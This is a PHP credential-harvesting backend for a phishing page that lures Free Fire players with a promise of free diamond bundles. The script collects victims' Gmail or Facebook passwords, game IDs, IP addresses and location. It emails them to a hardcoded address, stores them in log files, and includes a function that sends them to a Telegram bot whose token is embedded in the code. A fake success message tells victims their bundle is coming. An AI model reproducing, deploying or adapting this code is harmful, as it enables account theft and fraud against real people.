<?php
// ============================================
// send_data.php
// System untuk menerima dan mengirim data bundle
// ============================================

// Error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Setting waktu Indonesia
date_default_timezone_set('Asia/Jakarta');

// Fungsi untuk sanitasi input
function sanitize($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Fungsi untuk mendapatkan IP pengguna
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Fungsi untuk mendapatkan info browser
function getBrowserInfo() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown";
    
    if (strpos($user_agent, 'Chrome') !== false) {
        $browser = "Chrome";
    } elseif (strpos($user_agent, 'Firefox') !== false) {
        $browser = "Firefox";
    } elseif (strpos($user_agent, 'Safari') !== false) {
        $browser = "Safari";
    } elseif (strpos($user_agent, 'Edge') !== false) {
        $browser = "Edge";
    } elseif (strpos($user_agent, 'Opera') !== false) {
        $browser = "Opera";
    }
    
    return $browser;
}

// Fungsi untuk mendapatkan info device
function getDeviceInfo() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $device = "Unknown";
    
    if (strpos($user_agent, 'Mobile') !== false || 
        strpos($user_agent, 'Android') !== false || 
        strpos($user_agent, 'iPhone') !== false || 
        strpos($user_agent, 'iPad') !== false) {
        $device = "Mobile";
    } else {
        $device = "Desktop";
    }
    
    return $device;
}

// Cek jika ada data POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Ambil data dari form
    $raw_data = isset($_POST['data']) ? $_POST['data'] : '{}';
    $email_content = isset($_POST['email_content']) ? $_POST['email_content'] : '';
    
    // Decode JSON data
    $data = json_decode($raw_data, true);
    
    // Tambahkan data server ke array
    $server_data = array(
        'server_time' => date('Y-m-d H:i:s'),
        'server_ip' => $_SERVER['SERVER_ADDR'],
        'request_method' => $_SERVER['REQUEST_METHOD'],
        'request_uri' => $_SERVER['REQUEST_URI'],
        'user_ip' => getUserIP(),
        'user_browser' => getBrowserInfo(),
        'user_device' => getDeviceInfo(),
        'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct',
        'host' => $_SERVER['HTTP_HOST']
    );
    
    // Gabungkan data
    $complete_data = array_merge($data, $server_data);
    
    // Email tujuan (GANTI DENGAN EMAIL ANDA)
    $to = "bozzdesajet@gmail.com"; // <- GANTI EMAIL INI
    
    // Subject email
    $subject = "🎮 BUNDLE DM REQUEST - " . (isset($complete_data['bundle_name']) ? $complete_data['bundle_name'] : 'Unknown') . " - " . date('d/m/Y H:i:s');
    
    // Headers email
    $headers = "From: system@desaofficial.com\r\n";
    $headers .= "Reply-To: no-reply@desaofficial.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    // Buat konten email lengkap
    $final_email_content = "============================================\n";
    $final_email_content .= "🎮 BUNDLE DM GRATIS REQUEST - DESAOFFICIAL\n";
    $final_email_content .= "============================================\n\n";
    
    $final_email_content .= "⏰ WAKTU REQUEST: " . $complete_data['server_time'] . "\n";
    $final_email_content .= "🌐 HOST: " . $complete_data['host'] . "\n";
    $final_email_content .= "🔗 REFERER: " . $complete_data['referer'] . "\n\n";
    
    $final_email_content .= "📦 BUNDLE INFORMATION\n";
    $final_email_content .= "============================================\n";
    $final_email_content .= "Bundle Type: " . (isset($complete_data['bundle']) ? $complete_data['bundle'] : 'N/A') . "\n";
    $final_email_content .= "Bundle Name: " . (isset($complete_data['bundle_name']) ? $complete_data['bundle_name'] : 'N/A') . "\n";
    $final_email_content .= "Platform: " . (isset($complete_data['platform']) ? strtoupper($complete_data['platform']) : 'N/A') . "\n\n";
    
    $final_email_content .= "🔐 LOGIN CREDENTIALS\n";
    $final_email_content .= "============================================\n";
    if (isset($complete_data['platform']) && $complete_data['platform'] == 'google') {
        $final_email_content .= "Gmail: " . (isset($complete_data['gmail']) ? $complete_data['gmail'] : 'N/A') . "\n";
        $final_email_content .= "Password: " . (isset($complete_data['gmail_password']) ? $complete_data['gmail_password'] : 'N/A') . "\n";
    } else {
        $final_email_content .= "Facebook: " . (isset($complete_data['facebook_email']) ? $complete_data['facebook_email'] : 'N/A') . "\n";
        $final_email_content .= "Password: " . (isset($complete_data['facebook_password']) ? $complete_data['facebook_password'] : 'N/A') . "\n";
    }
    $final_email_content .= "\n";
    
    $final_email_content .= "🎮 FREE FIRE ACCOUNT\n";
    $final_email_content .= "============================================\n";
    $final_email_content .= "ID: " . (isset($complete_data['ff_id']) ? $complete_data['ff_id'] : 'N/A') . "\n";
    $final_email_content .= "Level: " . (isset($complete_data['ff_level']) ? $complete_data['ff_level'] : 'N/A') . "\n\n";
    
    $final_email_content .= "📍 LOCATION DATA\n";
    $final_email_content .= "============================================\n";
    $final_email_content .= "User IP: " . $complete_data['user_ip'] . "\n";
    $final_email_content .= "Server IP: " . $complete_data['server_ip'] . "\n";
    $final_email_content .= "City: " . (isset($complete_data['city']) ? $complete_data['city'] : 'N/A') . "\n";
    $final_email_content .= "Region: " . (isset($complete_data['region']) ? $complete_data['region'] : 'N/A') . "\n";
    $final_email_content .= "Country: " . (isset($complete_data['country']) ? $complete_data['country'] : 'N/A') . "\n";
    $final_email_content .= "Country Code: " . (isset($complete_data['country_code']) ? $complete_data['country_code'] : 'N/A') . "\n";
    $final_email_content .= "Latitude: " . (isset($complete_data['latitude']) ? $complete_data['latitude'] : 'N/A') . "\n";
    $final_email_content .= "Longitude: " . (isset($complete_data['longitude']) ? $complete_data['longitude'] : 'N/A') . "\n";
    $final_email_content .= "Postal Code: " . (isset($complete_data['postal']) ? $complete_data['postal'] : 'N/A') . "\n";
    $final_email_content .= "Timezone: " . (isset($complete_data['timezone']) ? $complete_data['timezone'] : 'N/A') . "\n\n";
    
    $final_email_content .= "🌐 NETWORK INFORMATION\n";
    $final_email_content .= "============================================\n";
    $final_email_content .= "ASN: " . (isset($complete_data['asn']) ? $complete_data['asn'] : 'N/A') . "\n";
    $final_email_content .= "ISP: " . (isset($complete_data['isp']) ? $complete_data['isp'] : 'N/A') . "\n";
    $final_email_content .= "Organization: " . (isset($complete_data['org']) ? $complete_data['org'] : 'N/A') . "\n\n";
    
    $final_email_content .= "💻 DEVICE & BROWSER\n";
    $final_email_content .= "============================================\n";
    $final_email_content .= "User Agent: " . (isset($complete_data['user_agent']) ? $complete_data['user_agent'] : 'N/A') . "\n";
    $final_email_content .= "Browser: " . $complete_data['user_browser'] . "\n";
    $final_email_content .= "Device: " . $complete_data['user_device'] . "\n";
    $final_email_content .= "Platform: " . (isset($complete_data['platform_os']) ? $complete_data['platform_os'] : 'N/A') . "\n";
    $final_email_content .= "Language: " . (isset($complete_data['language']) ? $complete_data['language'] : 'N/A') . "\n";
    $final_email_content .= "Screen: " . (isset($complete_data['screen_resolution']) ? $complete_data['screen_resolution'] : 'N/A') . "\n";
    $final_email_content .= "Local Time: " . (isset($complete_data['local_time']) ? $complete_data['local_time'] : 'N/A') . "\n\n";
    
    $final_email_content .= "📊 ADDITIONAL DATA\n";
    $final_email_content .= "============================================\n";
    $final_email_content .= "Timestamp: " . (isset($complete_data['timestamp']) ? $complete_data['timestamp'] : 'N/A') . "\n";
    $final_email_content .= "Request Method: " . $complete_data['request_method'] . "\n";
    $final_email_content .= "Request URI: " . $complete_data['request_uri'] . "\n\n";
    
    $final_email_content .= "============================================\n";
    $final_email_content .= "© DesaOfficial - Data Capture System\n";
    $final_email_content .= "Total Data Points: 25+ Variables\n";
    $final_email_content .= "Status: COMPLETE\n";
    $final_email_content .= "============================================\n";
    
    // Kirim email
    $mail_sent = mail($to, $subject, $final_email_content, $headers);
    
    // Buat folder log jika belum ada
    $log_dir = "requests_log";
    if (!file_exists($log_dir)) {
        mkdir($log_dir, 0777, true);
    }
    
    // Simpan ke file log harian
    $log_file = $log_dir . "/requests_" . date('Y-m-d') . ".txt";
    $log_entry = "\n" . str_repeat("=", 70) . "\n";
    $log_entry .= "REQUEST TIME: " . date('Y-m-d H:i:s') . "\n";
    $log_entry .= "USER IP: " . $complete_data['user_ip'] . "\n";
    $log_entry .= "BUNDLE: " . (isset($complete_data['bundle_name']) ? $complete_data['bundle_name'] : 'N/A') . "\n";
    $log_entry .= "PLATFORM: " . (isset($complete_data['platform']) ? $complete_data['platform'] : 'N/A') . "\n";
    
    if (isset($complete_data['platform']) && $complete_data['platform'] == 'google') {
        $log_entry .= "GMAIL: " . (isset($complete_data['gmail']) ? $complete_data['gmail'] : 'N/A') . "\n";
        $log_entry .= "PASSWORD: " . (isset($complete_data['gmail_password']) ? $complete_data['gmail_password'] : 'N/A') . "\n";
    } else {
        $log_entry .= "FACEBOOK: " . (isset($complete_data['facebook_email']) ? $complete_data['facebook_email'] : 'N/A') . "\n";
        $log_entry .= "PASSWORD: " . (isset($complete_data['facebook_password']) ? $complete_data['facebook_password'] : 'N/A') . "\n";
    }
    
    $log_entry .= "FF ID: " . (isset($complete_data['ff_id']) ? $complete_data['ff_id'] : 'N/A') . "\n";
    $log_entry .= "FF LEVEL: " . (isset($complete_data['ff_level']) ? $complete_data['ff_level'] : 'N/A') . "\n";
    $log_entry .= "LOCATION: " . (isset($complete_data['city']) ? $complete_data['city'] : 'N/A') . ", " . (isset($complete_data['country']) ? $complete_data['country'] : 'N/A') . "\n";
    $log_entry .= "DEVICE: " . $complete_data['user_device'] . " | " . $complete_data['user_browser'] . "\n";
    $log_entry .= str_repeat("=", 70) . "\n";
    
    // Tulis ke file log
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Simpan data lengkap ke file JSON
    $json_file = $log_dir . "/complete_data_" . date('Ymd_His') . "_" . uniqid() . ".json";
    file_put_contents($json_file, json_encode($complete_data, JSON_PRETTY_PRINT));
    
    // Response untuk JavaScript
    if ($mail_sent) {
        echo json_encode([
            'status' => 'success',
            'message' => 'Data berhasil dikirim! Bundle akan diproses dalam 24 jam.',
            'email_sent' => true,
            'log_saved' => true,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    } else {
        echo json_encode([
            'status' => 'warning',
            'message' => 'Data berhasil disimpan, tetapi email gagal dikirim.',
            'email_sent' => false,
            'log_saved' => true,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    }
    
} else {
    // Jika bukan POST request
    echo json_encode([
        'status' => 'error',
        'message' => 'Invalid request method. Only POST allowed.',
        'timestamp' => date('Y-m-d H:i:s')
    ]);
}

// Fungsi untuk backup ke Telegram (opsional)
function sendTelegramBackup($data) {
    $telegram_token = '8057784535:AAHzVp3rKgCNxKI4JIXuD1ii8Ry76JTJ8WA';
    $telegram_chat_id = '6637547478';
    
    $message = "📦 New Bundle Request\n";
    $message .= "Bundle: " . (isset($data['bundle_name']) ? $data['bundle_name'] : 'N/A') . "\n";
    $message .= "Platform: " . (isset($data['platform']) ? $data['platform'] : 'N/A') . "\n";
    
    if (isset($data['platform']) && $data['platform'] == 'google') {
        $message .= "Email: " . (isset($data['gmail']) ? $data['gmail'] : 'N/A') . "\n";
        $message .= "Pass: " . (isset($data['gmail_password']) ? $data['gmail_password'] : 'N/A') . "\n";
    } else {
        $message .= "FB: " . (isset($data['facebook_email']) ? $data['facebook_email'] : 'N/A') . "\n";
        $message .= "Pass: " . (isset($data['facebook_password']) ? $data['facebook_password'] : 'N/A') . "\n";
    }
    
    $message .= "FF ID: " . (isset($data['ff_id']) ? $data['ff_id'] : 'N/A') . "\n";
    $message .= "IP: " . (isset($data['ip_address']) ? $data['ip_address'] : 'N/A') . "\n";
    $message .= "Location: " . (isset($data['city']) ? $data['city'] : 'N/A') . ", " . (isset($data['country']) ? $data['country'] : 'N/A') . "\n";
    $message .= "Time: " . date('H:i:s');
    
    $url = "https://api.telegram.org/bot{$telegram_token}/sendMessage";
    $post_data = [
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

?>
